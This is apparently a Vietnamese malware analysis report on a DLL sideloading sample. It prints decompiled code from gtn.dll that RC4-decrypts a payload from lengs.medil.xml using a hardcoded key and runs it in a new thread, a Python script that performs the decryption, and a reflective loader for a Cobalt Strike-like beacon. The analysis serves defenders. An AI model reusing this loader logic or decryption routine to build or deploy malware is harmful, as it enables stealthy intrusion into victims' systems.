# report_jan-2-23

# A. Files:

Ta có 3 tệp như sau

```r
gtn.dll:         PE32 executable (DLL) (console) Intel 80386, for MS Windows
md5: 672b00b2b6a894bf1906b227bff6426f

lengs.medil.xml: data
md5: 12c618bd87592bcf14372eeb9b247642

win.exe:         PE32 executable (GUI) Intel 80386, for MS Windows
md5: 5d61be7db55b026a5d61a3eed09d0ead
```

Bước đầu tiên ta sẽ tra hash các file với virustotal, file thực thi `win.exe` với kết quả 0/70, file `lengs.medil.xml` được scan 6 tháng trước (2022-6-14) với kêt quả 0/50 và `gtn.dll` với kết quả  **28/70** . Như vậy, ta có thể đoán được khi người dùng chạy file thực thi win.exe, malicious code trong dll **gtn.dll** sẽ chạy.

# B. gtn.dll:

Đầu tiên ta tìm được hàm `Go` (export function of gtn.dll) mà win.exe gọi tới. 

> Ta sẽ tập chung vào việc phân tích malicious Dll **gtn.dll**.

Sử dụng ida plugin **FuncScanner**, ta sẽ sort theo xref để tìm ra hàm được gọi nhiều nhất nhưng ko phải là hàm của thư viện, ta tìm đến hàm **sub_10001064** dưởi đây:

```bash
int __cdecl sub_10001064(char a1, char a2){
  int v2 = sub_100011D9(&a1);
  if ( v2 )
    return sub_10001087(v2, &a2);
  else
    return 0;
}
```

`sub_100011D9` sẽ quyết định LoadLibrary **kernel32.dll** hay **kernelbase.dll** dựa vào hashed Dll name, và `sub_10001087` là wrap around của **GetProcAddr** nên ta sẽ rename lại `sub_10001064` → `mw_like_GetProcAddr` (tham số thứ nhất xác định dll, tham số thứ hai xác định API nào sẽ đc resolve). Như vậy, DLL này sử dụng dynamic resolve API với tham số là các hash. Ta sẽ xref từ hàm này để xem các called API.

![Untitled](report_jan-2-23%20eb99fe5da9f94262bcdf1eb84d8baeab/Untitled.png)

Từ hàm `mw_like_GetProcAddr` đã rename từ trước, ta sẽ trace lên hàm `Go`, ta tìm được hàm resolve rắt nhiều API hay ho: CreateMutexA, GetModuleFileNameW, VirtualProtect, beginthread. Nên ta đoán đoán là hàm này là hàm sử lí chính rename -> `mw_main`
```
Go
└───sub_10002BCF
	└───mw_main		
```
```c
int __thiscall mw_main(void *this, void *a2, int a3)
{
  int (__stdcall *f_CreateMutexA)(_DWORD, _DWORD, char *); // eax
  int v4; // esi
  void (__stdcall *f_GetModuleFileNameW)(_DWORD, char *, int); // eax
  int v6; // eax
  void **v7; // eax
  int *v8; // eax
  int *v10; // eax
  int (*f_GetTickCount)(void); // eax
  unsigned int v12; // eax
  unsigned int i; // esi
  _DWORD *v14; // eax
  unsigned int j; // esi
  EXCEPTION_POINTERS *v16; // edi
  int *v17; // esi
  void (__cdecl *f_VirtualProtect)(int *, unsigned int, int, void **); // eax
  void (__stdcall *f__beginthread)(EXCEPTION_POINTERS *, struct _EH3_EXCEPTION_REGISTRATION *, PVOID); // eax
  void (__stdcall *f_Sleep)(int); // eax
  int (__stdcall *f_CloseHandle)(int); // eax
  _DWORD *v22[6]; // [esp-14h] [ebp-2FCh] BYREF
  int v23; // [esp+4h] [ebp-2E4h]
  int v24; // [esp+8h] [ebp-2E0h]
  int v25; // [esp+Ch] [ebp-2DCh]
  unsigned int v26; // [esp+14h] [ebp-2D4h]
  unsigned int v27; // [esp+18h] [ebp-2D0h]
  void *v28; // [esp+1Ch] [ebp-2CCh]
  void *v29; // [esp+20h] [ebp-2C8h] BYREF
  void *v30[6]; // [esp+24h] [ebp-2C4h] BYREF
  __int16 v31[12]; // [esp+3Ch] [ebp-2ACh] BYREF
  int v32[6]; // [esp+54h] [ebp-294h] BYREF
  int v33[4]; // [esp+6Ch] [ebp-27Ch] BYREF
  unsigned int v34; // [esp+7Ch] [ebp-26Ch]
  unsigned int v35; // [esp+80h] [ebp-268h]
  int v36; // [esp+84h] [ebp-264h] BYREF
  int v_rc4_key[4]; // [esp+88h] [ebp-260h] BYREF
  char v38; // [esp+98h] [ebp-250h]
  char Src[520]; // [esp+9Ch] [ebp-24Ch] BYREF
  char v_mutex[44]; // [esp+2A4h] [ebp-44h] BYREF
  CPPEH_RECORD ms_exc; // [esp+2D0h] [ebp-18h]
  int savedregs; // [esp+2E8h] [ebp+0h]

  v28 = this;
  v29 = a2;
  strcpy(v_mutex, "{2C162931-8D57-421F-A4D1-F31111A5017F}");
  f_CreateMutexA = (int (__stdcall *)(_DWORD, _DWORD, char *))mw_GetProcAddr(194993052, 249828449);
  v4 = f_CreateMutexA(0, 0, v_mutex);
  if ( !v4 || GetLastError() == 183 )
  {
    f_CloseHandle = (int (__stdcall *)(int))mw_GetProcAddr(194993052, 162430389);
    return f_CloseHandle(v4);
  }
  else
  {
    sub_10001B47((int)v32, v29, a3);
    memset(Src, 0, sizeof(Src));
    f_GetModuleFileNameW = (void (__stdcall *)(_DWORD, char *, int))mw_GetProcAddr(194993052, 234523415);
    f_GetModuleFileNameW(0, Src, 260);
		// get full path of xml file
    sub_10001B24((int)v31, Src);
    v6 = sub_10002453((wchar_t *)v31, (unsigned __int16 *)"\\", -1);
    v7 = sub_10002DD1(v31, v30, 0, v6 + 1);
    v8 = sub_1000142F(&v36, (int)v7, v32);
    if ( v32 != v8 )
    {
      LOBYTE(v29) = 0;
      std::wstring::_Move_assign(v8, v29);
    }
    j_unknown_libname_5(&v36, v23, v24, v25);
    j_unknown_libname_5(v30, v23, v24, v25);
    sub_10001B05(v22, v32);
    mw_readFile((std::string *)v33, v22[0], (int)v22[1], (int)v22[2], (int)v22[3], (int)v22[4], (unsigned int)v22[5]);
    if ( v34 )
    {
      v_rc4_key[0] = 0x36442C7F;
      v_rc4_key[1] = 0x5DACBB62;
      v_rc4_key[2] = 0xCB729C56;
      v_rc4_key[3] = 0x916C5F17;
      v38 = 0;
      v10 = v33;
      if ( v35 >= 0x10 )
        v10 = (int *)v33[0]; 
      mw_dec_rc4((int)v10, v34, (int)v_rc4_key, 16);
      ms_exc.registration.TryLevel = 0;
      f_GetTickCount = (int (*)(void))mw_GetProcAddr(194993052, 220656292);
      v12 = f_GetTickCount();
      srand(v12);
      std::string::string((std::string *)&v36, byte_1001723C);
      for ( i = 0; ; ++i )
      {
        v27 = i;
        if ( i >= 0xF60000 )
          break;
        LOBYTE(v28) = rand() % 254 + 1;
        std::string::push_back(v28);
      }
      v14 = sub_100013E6(v30, &v36, v33);
      std::string::operator=(v14);
      j_unknown_libname_4(v30);
      for ( j = 0; ; ++j )
      {
        v26 = j;
        if ( j >= 0x7B00000 )
          break;
        LOBYTE(v28) = rand() % 254 + 1;
        std::string::push_back(v28);
      }
      v29 = 0;
      v16 = (EXCEPTION_POINTERS *)v33;
      if ( v35 >= 0x10 )
        v16 = (EXCEPTION_POINTERS *)v33[0];
      v17 = v33;
      if ( v35 >= 0x10 )
        v17 = (int *)v33[0];
      f_VirtualProtect = (void (__cdecl *)(int *, unsigned int, int, void **))mw_GetProcAddr(194993052, 120395876);
      f_VirtualProtect(v17, v34, 64, &v29);
      ms_exc.registration.ExceptionHandler = 0;
      ms_exc.registration.Next = 0;
      ms_exc.exc_ptr = v16 + 2015232;
      f__beginthread = (void (__stdcall *)(EXCEPTION_POINTERS *, struct _EH3_EXCEPTION_REGISTRATION *, PVOID))mw_GetProcAddr(141820332, 66532724);
      f__beginthread(ms_exc.exc_ptr, ms_exc.registration.Next, ms_exc.registration.ExceptionHandler);
      j_unknown_libname_4(&v36);
      ms_exc.registration.TryLevel = -2;
      while ( 1 )
      {
        savedregs = 1024;
        f_Sleep = (void (__stdcall *)(int))mw_GetProcAddr(194993052, 5909440);
        f_Sleep(savedregs);
      }
    }
    j_unknown_libname_4(v33);
    j_unknown_libname_5(v31, v23, v24, v25);
    return j_unknown_libname_5(v32, v23, v24, v25);
  }
}
```

Hàm này sẽ:

1. Tạo mutex `{2C162931-8D57-421F-A4D1-F31111A5017F}`
2. Đọc file `lengs.medil.xml` và giải mã (RC4) file đó với key (= `7F2C443662BBAC5D569C72CB175F6C91` , key length = 16) được khởi tạo ở trên và lưu vào kết quả giải mã đc vào buffer `v10`  (shellcode). Hàm giải mã RC4:

    ```c
    int __stdcall mw_dec_rc4(int arg_buf_res, unsigned int arg_buf_len, int arg_key, int equ_16)
    {
      int v4; // esi
      int i; // ecx
      int v6; // edi
      int j; // edx
      int v8; // ecx
      int v9; // eax
      int v10; // edx
      unsigned int k; // edi
      int v12; // ecx
      int v13; // eax
      int v15[512]; // [esp+Ch] [ebp-804h]
    
      v4 = 0;
      for ( i = 0; i < 256; ++i )
      {
        v15[i + 256] = i;
        v15[i] = *(unsigned __int8 *)(i % equ_16 + arg_key);
      }
      v6 = 0;
      for ( j = 0; j < 256; ++j )
      {
        v8 = v15[j + 256];
        v6 = (v8 + v15[j] + v6) % 256;
        v9 = v15[v6 + 256];
        v15[v6 + 256] = v8;
        v15[j + 256] = v9;
      }
      v10 = 0;
      for ( k = 0; k < arg_buf_len; ++k )
      {
        v4 = (v4 + 1) % 256; // i
        v12 = v15[v4 + 256];
        v10 = (v12 + v10) % 256; // j
    		// swap
        v13 = v15[v10 + 256];
        v15[v10 + 256] = v12;
        v15[v4 + 256] = v13;
    		// assign
        *(_BYTE *)(arg_buf_res + k) ^= LOBYTE(v15[(v13 + v15[v10 + 256]) % 256 + 256]);
      }
      return arg_buf_res;
    }
    ```
    Sau khi viết lại hàm này = python, ta thu được shellcode là file **out.bin**
    ```python
    fOut = "out.bin"
    key = bytes.fromhex('7F2C443662BBAC5D569C72CB175F6C91')
    res =  []

    def dec_rc4(cipherT, size, key, keyLen = 16):
	S = [i for i in range(256)]# v15[256+]
	K = [key[i%keyLen] for i in range(256)]

	j = 0
	for i in range(256):
		j = (S[i] + K[i] + j) % 256
		S[i], S[j] = S[j], S[i]

	i = 0
	j = 0
	for k in range(size):
		i = (i + 1) % 256 # v4
		j = (j + S[i]) % 256 # v10
		S[i], S[j] = S[j], S[i]

		res.append(int((S[(S[i] + S[j]) % 256]) ^ cipherT[k]))
			
    with open("lengs.medil.xml", 'rb') as fIn:
		buf = fIn.read()

    dec_rc4(buf, len(buf), key)

    with open(fOut, "wb") as f:
	f.write(bytearray(res))
	```
3. Tạo thread mới để chạy shellcode trên.
```c
uintptr_t _beginthread( // NATIVE CODE
   void( __cdecl *start_address )( void * ),
   unsigned stack_size,
   void *arglist
);
```
Ta sẽ đặt breakpoint tại hàm `_beginthread` và dump shellcode từ tham số đầu tiên của hàm này.
# C. shellcode:

> Shellcode bắt đầu vs 2 byte quen thuộc `4D 5A` (`MZ`) 🕵️

Nên ta sẽ bỏ vào PE-bear để xem, và tìm được 2 strings lạ `Lotes.dll` và `ReflectiveLoader@4` (Exports tab)

![Untitled](report_jan-2-23%20eb99fe5da9f94262bcdf1eb84d8baeab/Untitled%201.png)

Sau khi sử dụng 2 keyword này tìm trên gg, dẫn đến [post](https://kienmanowar.wordpress.com/2022/06/04/quicknote-cobaltstrike-smb-beacon-analysis-2/) của a Kiên (**4. Analyze Lotes.dll)**. Hàm dưới đây tương tự [code](https://github.com/stephenfewer/grinder/blob/master/node/source/logger/ReflectiveLoader.c)

Shellcode này bản chất là 1 file PE (DLL) hoàn chỉnh, nó sẽ load chính nó vào trusted process `win.exe` (signed by Google) đang chạy, dưới 1 thread mới sử dụng kĩ thuật ReflectiveLoader.
```c
void (__stdcall *__stdcall mw_reflectiveLoader(int arg_param))(unsigned int, int, int)
{
  _BYTE *v4; // [esp+8h] [ebp-78h]
  int v5; // [esp+Ch] [ebp-74h]
  int v6; // [esp+10h] [ebp-70h]
  _IMAGE_DOS_HEADER *i; // [esp+14h] [ebp-6Ch]
  _IMAGE_DOS_HEADER *pe_file; // [esp+14h] [ebp-6Ch]
  _IMAGE_DOS_HEADER *pe_filea; // [esp+14h] [ebp-6Ch]
  void *v10; // [esp+18h] [ebp-68h]
  unsigned int m; // [esp+1Ch] [ebp-64h]
  unsigned int ii; // [esp+1Ch] [ebp-64h]
  _DWORD *v13; // [esp+20h] [ebp-60h]
  char NumberOfSymbols; // [esp+27h] [ebp-59h]
  int (__stdcall *f_LoadLibraryExA)(_IMAGE_DOS_HEADER *, _DWORD, int); // [esp+28h] [ebp-58h]
  __int16 Blink; // [esp+2Ch] [ebp-54h]
  __int16 v17; // [esp+2Ch] [ebp-54h]
  struct _LIST_ENTRY *Flink; // [esp+30h] [ebp-50h]
  void *v19; // [esp+30h] [ebp-50h]
  unsigned int v20; // [esp+30h] [ebp-50h]
  _DWORD *v21; // [esp+34h] [ebp-4Ch]
  _IMAGE_NT_HEADERS *v22; // [esp+34h] [ebp-4Ch]
  unsigned __int16 *v23; // [esp+38h] [ebp-48h]
  unsigned int v24; // [esp+3Ch] [ebp-44h]
  PPEB_LDR_DATA Ldr; // [esp+40h] [ebp-40h]
  unsigned int new_base_addr; // [esp+40h] [ebp-40h]
  int (__stdcall *f_GetProcAddress)(int, unsigned int); // [esp+44h] [ebp-3Ch]
  unsigned int v28; // [esp+48h] [ebp-38h]
  struct _LIST_ENTRY *j; // [esp+4Ch] [ebp-34h]
  unsigned int SizeOfHeaders; // [esp+4Ch] [ebp-34h]
  _DWORD *v31; // [esp+4Ch] [ebp-34h]
  _DWORD *n; // [esp+4Ch] [ebp-34h]
  unsigned int v33; // [esp+4Ch] [ebp-34h]
  void (__stdcall *dll_entry_point)(unsigned int, int, int); // [esp+4Ch] [ebp-34h]
  int NumberOfSections; // [esp+50h] [ebp-30h]
  int (__stdcall *f_VirtualAlloc)(_DWORD, DWORD, int, int); // [esp+54h] [ebp-2Ch]
  int (__stdcall *f_GetModuleHandleA)(_IMAGE_DOS_HEADER *); // [esp+5Ch] [ebp-24h]
  _DWORD *v38; // [esp+60h] [ebp-20h]
  unsigned int v39; // [esp+64h] [ebp-1Ch]
  int *v40; // [esp+64h] [ebp-1Ch]
  _WORD *jj; // [esp+64h] [ebp-1Ch]
  int (__stdcall *f_LoadLibraryA)(void *); // [esp+68h] [ebp-18h]
  void (__stdcall *f_VirtualProtect)(unsigned int, DWORD, int, char *); // [esp+6Ch] [ebp-14h]
  int perm; // [esp+70h] [ebp-10h]
  unsigned int e_lfanew; // [esp+74h] [ebp-Ch]
  _IMAGE_NT_HEADERS *v46; // [esp+74h] [ebp-Ch]
  char oldProtect[4]; // [esp+78h] [ebp-8h] BYREF
  unsigned int k; // [esp+7Ch] [ebp-4h]

  v28 = 0;
  v24 = 0;
  for ( i = (_IMAGE_DOS_HEADER *)&loc_10047170; ; i = (_IMAGE_DOS_HEADER *)((char *)i + 0xFFFFFFFF) )
  {
    if ( i->e_magic == 0x5A4D )
    {
      e_lfanew = i->e_lfanew;
      if ( e_lfanew >= 64 && e_lfanew < 1024 && *(_DWORD *)((char *)&i->e_magic + e_lfanew) == 0x4550 )
        break;
    }
  }
  Ldr = NtCurrentPeb()->Ldr;
  for ( j = Ldr->InMemoryOrderModuleList.Flink; j; j = j->Flink )
  {
    Flink = j[5].Flink;
    Blink = (__int16)j[4].Blink;
    k = 0;
    do
    {
      k = __ROR4__(k, 0xD);
      if ( LOBYTE(Flink->Flink) < 0x61u )
        k += LOBYTE(Flink->Flink);
      else
        k = k + LOBYTE(Flink->Flink) - 0x20;
      Flink = (struct _LIST_ENTRY *)((char *)Flink + 1);
      --Blink;
    }
    while ( Blink );
    if ( k == 0x6A4ABC5B )                      // kernel32.dll
    {
      Ldr = (PPEB_LDR_DATA)j[2].Flink;
      break;
    }
  }
  v21 = (struct _LIST_ENTRY **)((char *)&(*(struct _LIST_ENTRY **)((char *)&Ldr[1].InLoadOrderModuleList.Flink[0xF].Flink
                                                                 + (unsigned int)Ldr))->Flink
                              + (unsigned int)Ldr);
  v38 = (ULONG *)((char *)&Ldr->Length + v21[8]);
  v23 = (unsigned __int16 *)((char *)Ldr + v21[9]);
  v17 = 6;
  while ( v17 )
  {
    v4 = (char *)Ldr + *v38;
    v5 = 0;
    do
      v5 = __ROR4__(v5, 0xD) + (char)*v4++;
    while ( *v4 );
    if ( v5 == 0xEC0E4E8E
      || v5 == 0x7C0DFCAA
      || v5 == 0x91AFCA54
      || v5 == 0x7946C61B
      || v5 == 0x753A4FC
      || v5 == 0xD3324904 )
    {
      v13 = (ULONG *)((char *)&Ldr->Length + 4 * *v23 + v21[7]);
      switch ( v5 )
      {
        case 0xEC0E4E8E:
          f_LoadLibraryA = (int (__stdcall *)(void *))((char *)Ldr + *v13);
          break;
        case 0x7C0DFCAA:
          f_GetProcAddress = (int (__stdcall *)(int, unsigned int))((char *)Ldr + *v13);
          break;
        case 0x91AFCA54:
          f_VirtualAlloc = (int (__stdcall *)(_DWORD, DWORD, int, int))((char *)Ldr + *v13);
          break;
        case 0x7946C61B:
          f_VirtualProtect = (void (__stdcall *)(unsigned int, DWORD, int, char *))((char *)Ldr + *v13);
          break;
        case 0x753A4FC:
          f_LoadLibraryExA = (int (__stdcall *)(_IMAGE_DOS_HEADER *, _DWORD, int))((char *)Ldr + *v13);
          break;
        default:
          f_GetModuleHandleA = (int (__stdcall *)(_IMAGE_DOS_HEADER *))((char *)Ldr + *v13);
          break;
      }
      --v17;
    }
    ++v38;
    ++v23;
  }                                             // 
                                                // 
                                                // done api solving
                                                // 
  v46 = (_IMAGE_NT_HEADERS *)((char *)i + i->e_lfanew);
  if ( (v46->FileHeader.Characteristics & (unsigned __int16)IMAGE_FILE_BYTES_REVERSED_HI) != 0 )
    perm = 0x40;
  else
    perm = 4;
  new_base_addr = 0;
  if ( (v46->FileHeader.Characteristics & 0x4000) != 0 && !f_GetModuleHandleA(i + 1) )
  {
    v6 = f_LoadLibraryExA(i + 1, 0, 1);
    for ( k = 1; v6 != 0xFFFFFFFF && k < 0x10 && !new_base_addr; ++k )
      new_base_addr = f_GetProcAddress(v6, k);
    if ( new_base_addr )
    {
      new_base_addr -= new_base_addr % 0x1000;
      f_VirtualProtect(new_base_addr, v46->OptionalHeader.SizeOfImage, perm, oldProtect);
      memset((void *)new_base_addr, 0, v46->OptionalHeader.SizeOfImage);
      f_VirtualProtect(new_base_addr, v46->OptionalHeader.SizeOfImage, perm, oldProtect);
    }
  }
  if ( !new_base_addr )
  {
    new_base_addr = f_VirtualAlloc(0, v46->OptionalHeader.SizeOfImage, 0x3000, perm);
    memset((void *)new_base_addr, 0, v46->OptionalHeader.SizeOfImage);
  }
  v10 = (void *)(new_base_addr + v46->OptionalHeader.SizeOfImage - 0x40);
  NumberOfSymbols = v46->FileHeader.NumberOfSymbols;
  SizeOfHeaders = v46->OptionalHeader.SizeOfHeaders;
  k = new_base_addr;
  if ( NumberOfSymbols )
  {
    new_base_addr -= v46->OptionalHeader.SectionAlignment;
  }
  else
  {
    qmemcpy((void *)k, i, SizeOfHeaders);
    if ( (v46->FileHeader.Characteristics & 1) != 0 )
    {
      *(_DWORD *)(*(_DWORD *)(k + 0x3C) + new_base_addr) = 0;
      *(_WORD *)k = 0;
      *(_DWORD *)(k + 0x3C) = 0;
    }
  }
  v31 = (_DWORD *)((char *)&v46->OptionalHeader.Magic + v46->FileHeader.SizeOfOptionalHeader);
  NumberOfSections = v46->FileHeader.NumberOfSections;
  while ( NumberOfSections-- )
  {
    v19 = (void *)(v31[3] + new_base_addr);
    k = (unsigned int)i + v31[5];
    v39 = v31[4];
    qmemcpy(v19, (const void *)k, v39);
    if ( (v31[9] & 0x20000000) != 0 )
    {
      v28 = (unsigned int)v19;
      v24 = v39;
    }
    v31 += 0xA;
  }
  for ( k = v46->OptionalHeader.DataDirectory[1].VirtualAddress + new_base_addr; *(_DWORD *)(k + 0xC); k += 0x14 )
  {
    qmemcpy(v10, (const void *)(*(_DWORD *)(k + 0xC) + new_base_addr), 0x40u);
    for ( m = 0; m < 0x40; ++m )
      *((_BYTE *)v10 + m) ^= NumberOfSymbols;
    pe_file = (_IMAGE_DOS_HEADER *)f_LoadLibraryA(v10);
    v40 = (int *)(*(_DWORD *)k + new_base_addr);
    for ( n = (_DWORD *)(*(_DWORD *)(k + 0x10) + new_base_addr); *n; ++n )
    {
      if ( v40 && *v40 < 0 )
      {
        v22 = (_IMAGE_NT_HEADERS *)((char *)pe_file + *(_DWORD *)((char *)&pe_file[1].e_res2[8] + pe_file->e_lfanew));
        *n = (char *)pe_file
           + *(_DWORD *)((char *)&pe_file->e_magic
                       + 4 * ((unsigned __int16)*v40 - v22->FileHeader.NumberOfSymbols)
                       + v22->OptionalHeader.SizeOfCode);
      }
      else
      {
        qmemcpy(v10, (const void *)(*n + new_base_addr + 2), 0x40u);
        for ( ii = 0; ii < 0x40; ++ii )
          *((_BYTE *)v10 + ii) ^= NumberOfSymbols;
        *n = f_GetProcAddress((int)pe_file, (unsigned int)v10);
      }
      if ( v40 )
        ++v40;
    }
  }
  memset(v10, 0, 0x40u);                        // 
                                                // Rebasing
                                                // 
  pe_filea = (_IMAGE_DOS_HEADER *)(new_base_addr - v46->OptionalHeader.ImageBase);
  if ( v46->OptionalHeader.DataDirectory[5].Size )
  {
    for ( k = v46->OptionalHeader.DataDirectory[5].VirtualAddress + new_base_addr;
          *(_DWORD *)(k + 4);
          k += *(_DWORD *)(k + 4) )
    {
      v33 = *(_DWORD *)k + new_base_addr;
      v20 = (unsigned int)(*(_DWORD *)(k + 4) - 8) >> 1;
      for ( jj = (_WORD *)(k + 8); v20--; ++jj )
      {
        switch ( (unsigned __int8)HIBYTE(*jj) >> 4 )
        {
          case 0xA:
            *(_DWORD *)(v33 + (*jj & 0xFFF)) += pe_filea;
            break;
          case 3:
            *(_DWORD *)(v33 + (*jj & 0xFFF)) += pe_filea;
            break;
          case 1:
            *(_WORD *)(v33 + (*jj & 0xFFF)) += HIWORD(pe_filea);
            break;
          case 2:
            *(_WORD *)(v33 + (*jj & 0xFFF)) += (_WORD)pe_filea;
            break;
        }
      }
    }
  }
  if ( v28 && v24 && perm == 4 )
    f_VirtualProtect(v28, v24, 0x20, oldProtect);
  if ( (v46->FileHeader.Characteristics & 0x1000) != 0 )
    dll_entry_point = (void (__stdcall *)(unsigned int, int, int))(v46->OptionalHeader.LoaderFlags + new_base_addr);
  else
    dll_entry_point = (void (__stdcall *)(unsigned int, int, int))(v46->OptionalHeader.AddressOfEntryPoint
                                                                 + new_base_addr);
  dll_entry_point(new_base_addr, 1, arg_param);
  return dll_entry_point;
}
```

Sử dụng [1768.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py) để extract behaviour của shellcode:

![Untitled](report_jan-2-23%20eb99fe5da9f94262bcdf1eb84d8baeab/Untitled%202.png)
